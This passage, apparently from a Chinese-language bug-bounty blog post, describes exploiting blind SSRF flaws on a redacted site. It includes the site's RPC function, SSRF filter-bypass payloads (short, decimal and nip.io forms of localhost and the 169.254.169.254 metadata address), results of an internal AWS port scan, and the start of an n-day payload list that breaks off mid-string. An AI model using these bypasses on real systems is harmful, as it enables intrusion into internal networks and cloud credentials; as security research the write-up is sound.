+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-js" data-lang="js"><span style="display:flex;"><span> <span style="color:#a6e22e">RPC</span>(<span style="color:#e6db74">&#39;url-health-check/check&#39;</span>, {<span style="color:#a6e22e">url</span><span style="color:#f92672">:</span> <span style="color:#e6db74">&#34;https:\/\/www.instagram.com\/p\/BuMIheXHKsS\/&#34;</span>, <span style="color:#a6e22e">sourceUrl</span><span style="color:#f92672">:</span> <span style="color:#e6db74">&#34;https:\/\/www.target.com\/give-5-get-5\/UOG262&#34;</span>});
+</span></span></code></pre></div><p>RPC 是目标站点封装好的一个用来发送http请求的函数</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-js" data-lang="js"><span style="display:flex;"><span><span style="color:#a6e22e">console</span>.<span style="color:#a6e22e">log</span>(<span style="color:#a6e22e">RPC</span><span style="color:#f92672">+</span><span style="color:#e6db74">&#39;&#39;</span>)
+</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-js" data-lang="js"><span style="display:flex;"><span><span style="color:#66d9ef">function</span> <span style="color:#a6e22e">RPC</span>(<span style="color:#a6e22e">e</span>, <span style="color:#a6e22e">t</span>, <span style="color:#a6e22e">o</span>, <span style="color:#a6e22e">i</span>) {
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">i</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">i</span> <span style="color:#f92672">||</span> {},
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">t</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">t</span> <span style="color:#f92672">||</span> {};
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">var</span> <span style="color:#a6e22e">s</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">e</span>.<span style="color:#a6e22e">split</span>(<span style="color:#e6db74">&#34;/&#34;</span>),
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">l</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">null</span>,
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">d</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">null</span>,
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">p</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">null</span>;
+</span></span><span style="display:flex;"><span>    <span style="color:#ae81ff">3</span> <span style="color:#f92672">===</span> <span style="color:#a6e22e">s</span>.<span style="color:#a6e22e">length</span> <span style="color:#f92672">?</span> (<span style="color:#a6e22e">l</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">s</span>[<span style="color:#ae81ff">0</span>], <span style="color:#a6e22e">d</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">s</span>[<span style="color:#ae81ff">1</span>], <span style="color:#a6e22e">p</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">s</span>[<span style="color:#ae81ff">2</span>]) <span style="color:#f92672">:</span> <span style="color:#ae81ff">2</span> <span style="color:#f92672">===</span> <span style="color:#a6e22e">s</span>.<span style="color:#a6e22e">length</span> <span style="color:#f92672">?</span> (<span style="color:#a6e22e">d</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">s</span>[<span style="color:#ae81ff">0</span>], <span style="color:#a6e22e">p</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">s</span>[<span style="color:#ae81ff">1</span>]) <span style="color:#f92672">:</span> <span style="color:#a6e22e">console</span>.<span style="color:#a6e22e">error</span>(<span style="color:#e6db74">&#34;RPC call got strange URL: &#34;</span> <span style="color:#f92672">+</span> <span style="color:#a6e22e">e</span>);
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">var</span> <span style="color:#a6e22e">u</span> <span style="color:#f92672">=</span> (<span style="color:#a6e22e">l</span> <span style="color:#f92672">?</span> <span style="color:#e6db74">&#34;/&#34;</span> <span style="color:#f92672">+</span> <span style="color:#a6e22e">l</span><span style="color:#f92672">:</span> <span style="color:#e6db74">&#34;&#34;</span>) <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;/rpc/&#34;</span> <span style="color:#f92672">+</span> <span style="color:#a6e22e">d</span> <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;-rpc/&#34;</span> <span style="color:#f92672">+</span> <span style="color:#a6e22e">p</span>,
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">c</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">void</span> <span style="color:#ae81ff">0</span> <span style="color:#f92672">===</span> <span style="color:#a6e22e">i</span>.<span style="color:#a6e22e">context</span> <span style="color:#f92672">?</span> <span style="color:#66d9ef">null</span><span style="color:#f92672">:</span> <span style="color:#a6e22e">i</span>.<span style="color:#a6e22e">context</span>,
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">h</span> <span style="color:#f92672">=</span> {
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">url</span><span style="color:#f92672">:</span> <span style="color:#a6e22e">u</span>,
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">method</span><span style="color:#f92672">:</span> <span style="color:#e6db74">&#34;POST&#34;</span>,
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">dataType</span><span style="color:#f92672">:</span> <span style="color:#e6db74">&#34;json&#34;</span>,
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">data</span><span style="color:#f92672">:</span> <span style="color:#a6e22e">t</span>,
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">success</span><span style="color:#f92672">:</span> <span style="color:#66d9ef">function</span>(<span style="color:#a6e22e">t</span>) {
+</span></span><span style="display:flex;"><span>            <span style="color:#a6e22e">a</span>(<span style="color:#a6e22e">e</span>, <span style="color:#a6e22e">t</span>),
+</span></span><span style="display:flex;"><span>            <span style="color:#a6e22e">o</span> <span style="color:#f92672">&amp;&amp;</span> <span style="color:#a6e22e">o</span>.<span style="color:#a6e22e">call</span>(<span style="color:#a6e22e">c</span>, <span style="color:#a6e22e">t</span>.<span style="color:#a6e22e">result</span>)
+</span></span><span style="display:flex;"><span>        },
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">error</span><span style="color:#f92672">:</span> <span style="color:#a6e22e">r</span>.<span style="color:#a6e22e">bind</span>(<span style="color:#66d9ef">null</span>, <span style="color:#a6e22e">u</span>, <span style="color:#a6e22e">e</span>, <span style="color:#a6e22e">t</span>)
+</span></span><span style="display:flex;"><span>    };
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">n</span>.<span style="color:#a6e22e">U</span>.<span style="color:#a6e22e">O2O</span>(<span style="color:#a6e22e">h</span>, <span style="color:#a6e22e">i</span>);
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">const</span> <span style="color:#a6e22e">f</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">h</span>.<span style="color:#a6e22e">beforeSend</span>;
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">h</span>.<span style="color:#a6e22e">beforeSend</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">function</span>(<span style="color:#a6e22e">e</span>) {
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">e</span>.<span style="color:#a6e22e">setRequestHeader</span>(<span style="color:#e6db74">&#34;X-CSRF-Token&#34;</span>, window.<span style="color:#a6e22e">yii</span>.<span style="color:#a6e22e">getCsrfToken</span>()),
+</span></span><span style="display:flex;"><span>        window.<span style="color:#a6e22e">embeddedDesigner</span> <span style="color:#f92672">&amp;&amp;</span> <span style="color:#a6e22e">e</span>.<span style="color:#a6e22e">setRequestHeader</span>(<span style="color:#e6db74">&#34;X-Embedded-Designer&#34;</span>, <span style="color:#f92672">!</span><span style="color:#ae81ff">0</span>),
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">f</span> <span style="color:#f92672">&amp;&amp;</span> <span style="color:#a6e22e">f</span>(<span style="color:#a6e22e">e</span>)
+</span></span><span style="display:flex;"><span>    },
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">!</span><span style="color:#a6e22e">o</span>) <span style="color:#66d9ef">return</span> <span style="color:#66d9ef">new</span> Promise((<span style="color:#66d9ef">function</span>(<span style="color:#a6e22e">o</span>, <span style="color:#a6e22e">n</span>) {
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">h</span>.<span style="color:#a6e22e">success</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">function</span>(<span style="color:#a6e22e">t</span>) {
+</span></span><span style="display:flex;"><span>            <span style="color:#a6e22e">a</span>(<span style="color:#a6e22e">e</span>, <span style="color:#a6e22e">t</span>),
+</span></span><span style="display:flex;"><span>            <span style="color:#a6e22e">o</span>(<span style="color:#a6e22e">t</span>.<span style="color:#a6e22e">result</span>)
+</span></span><span style="display:flex;"><span>        },
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">h</span>.<span style="color:#a6e22e">error</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">function</span>(<span style="color:#a6e22e">o</span>) {
+</span></span><span style="display:flex;"><span>            <span style="color:#a6e22e">i</span>.<span style="color:#a6e22e">error</span> <span style="color:#f92672">?</span> <span style="color:#a6e22e">i</span>.<span style="color:#a6e22e">error</span>(<span style="color:#a6e22e">o</span>) <span style="color:#f92672">:</span> <span style="color:#a6e22e">r</span>(<span style="color:#ae81ff">0</span>, <span style="color:#a6e22e">e</span>, <span style="color:#a6e22e">t</span>, <span style="color:#a6e22e">o</span>),
+</span></span><span style="display:flex;"><span>            <span style="color:#a6e22e">n</span>(<span style="color:#a6e22e">o</span>)
+</span></span><span style="display:flex;"><span>        },
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">$</span>.<span style="color:#a6e22e">ajax</span>(<span style="color:#a6e22e">h</span>)
+</span></span><span style="display:flex;"><span>    }));
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">$</span>.<span style="color:#a6e22e">ajax</span>(<span style="color:#a6e22e">h</span>)
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p>这段js代码揭示了RPC URL的结构：</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>/rpc/xxxx-rpc/xxxx
+</span></span></code></pre></div><p>比如输入:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>url-health-check/check
+</span></span></code></pre></div><p>对应生成的RPC URL为:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>/rpc/url-health-check-rpc/check
+</span></span></code></pre></div><h2 id="第二个blind-ssrf半盲">第二个Blind SSRF(半盲)</h2>
+<p>我继续检查目标站点的其他功能，发现了第二个SSRF：一个 webhook 模拟器功能，输入一个URL，目标站点会向该URL 发送一个POST请求。但是POST请求的请求体不可控。</p>
+<p>这个模拟器功能很有意思，他会向你指定的URL发送POST请求，且SSRF请求的得到的响应报文的响应码会回显到这个api的响应报文中。</p>
+<p>由于这个SSRF 所处的位置过于明显，目标站点部署了 SSRF filter 来检查用户输入的URL，经过一番探测，该SSRF filter 似乎采用了黑名单校验机制。比如，我先筛选出该目标的所有403 子域，通过该SSRF漏洞访问，发现所有的403 子域名都在黑名单上。</p>
+<p>经过更多的尝试之后，我逐渐掌握了SSRF fitler 的部分黑名单规则:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>是否存在 localhost 关键字
+</span></span><span style="display:flex;"><span>http://127.0.0.1
+</span></span><span style="display:flex;"><span>http://192.168.x.x
+</span></span><span style="display:flex;"><span>http://169.254.169.254
+</span></span><span style="display:flex;"><span>https://*.redacted.com
+</span></span><span style="display:flex;"><span>https://*.theredacted.com
+</span></span></code></pre></div><p>不过可以绕过这个SSRF filter的姿势很多:</p>
+<p>姿势1：</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>http://127.1:80
+</span></span></code></pre></div><p>姿势2：将点分十进制表示的IP转化为十进制IP地址绕过</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>http://2130706433/ = http://127.0.0.1
+</span></span><span style="display:flex;"><span>http://3232235521/ = http://192.168.0.1
+</span></span><span style="display:flex;"><span>http://3232235777/ = http://192.168.1.1
+</span></span><span style="display:flex;"><span>http://2852039166/  = http://169.254.169.254
+</span></span></code></pre></div><p>姿势3： 利用DNS解析</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>http://customer1.app.my.company.127.0.0.1.nip.io = 127.0.0.1
+</span></span></code></pre></div><h2 id="第三个blind-ssrf">第三个Blind SSRF</h2>
+<p>能否结合利用以上两个Blind SSRF呢？比如说:</p>
+<ol>
+<li>利用 webhook SSRF 进行 XSPA，扫描内网中存活的主机和开放的端口</li>
+<li>利用 url-health-check SSRF 发送payload 探测内网中存活的主机是否存在SSRF或者RCE等可以触发反连的漏洞</li>
+</ol>
+<p>因为 webhook api 设置了速率限制，大概一小时只能发送100来个请求，所以挑选扫描范围非常重要。我注意到目标站点的部署在AWS上，所以就先使用webhook SSRF 扫描了AWS 默认VPC的内网范围, aws 一个vpc至少需要跨三个区域，所以一个vpc下至少需要有三个子网。</p>
+<p>我的扫描范围如下:</p>
+<ul>
+<li>172.32.0.1/16
+<ul>
+<li>172.32.0.0/24</li>
+<li>172.32.1.0/24</li>
+<li>172.32.2.0/24</li>
+<li>172.32.3.0/24</li>
+<li>172.32.4.0/24</li>
+<li>172.32.16.0/24</li>
+<li>172.32.32.0/24</li>
+<li>172.32.48.0/24</li>
+</ul>
+</li>
+</ul>
+<p>为了不被速率限制ban掉，我将延时设置的很长，挂在电脑后台大概扫了三四天，一共发现存活的内网主机以及开放的端口如下:</p>
+<ul>
+<li>127.0.0.1
+<ul>
+<li>80</li>
+<li>443</li>
+</ul>
+</li>
+<li>172.31.16.165
+<ul>
+<li>80</li>
+<li>443</li>
+<li>801</li>
+</ul>
+</li>
+<li>172.31.0.156
+<ul>
+<li>80</li>
+</ul>
+</li>
+<li>172.31.1.0/24
+<ul>
+<li>172.31.1.1
+<ul>
+<li>80</li>
+<li>443</li>
+</ul>
+</li>
+<li>172.31.1.75
+<ul>
+<li>80</li>
+<li>443</li>
+</ul>
+</li>
+<li>172.31.1.107
+<ul>
+<li>80</li>
+<li>443</li>
+</ul>
+</li>
+<li>172.31.1.147
+<ul>
+<li>80</li>
+<li>443</li>
+<li>8181</li>
+<li>8443</li>
+</ul>
+</li>
+</ul>
+</li>
+<li>172.31.2.0/24
+<ul>
+<li>172.31.2.58
+<ul>
+<li>80</li>
+</ul>
+</li>
+<li>172.31.2.172
+<ul>
+<li>80</li>
+<li>443</li>
+</ul>
+</li>
+<li>172.31.2.225
+<ul>
+<li>80 403</li>
+</ul>
+</li>
+<li>172.31.2.49
+<ul>
+<li>80 204</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+<p>然后我整理了常用的SSRF nday以及RCE nday的payload:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>/?unix:AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA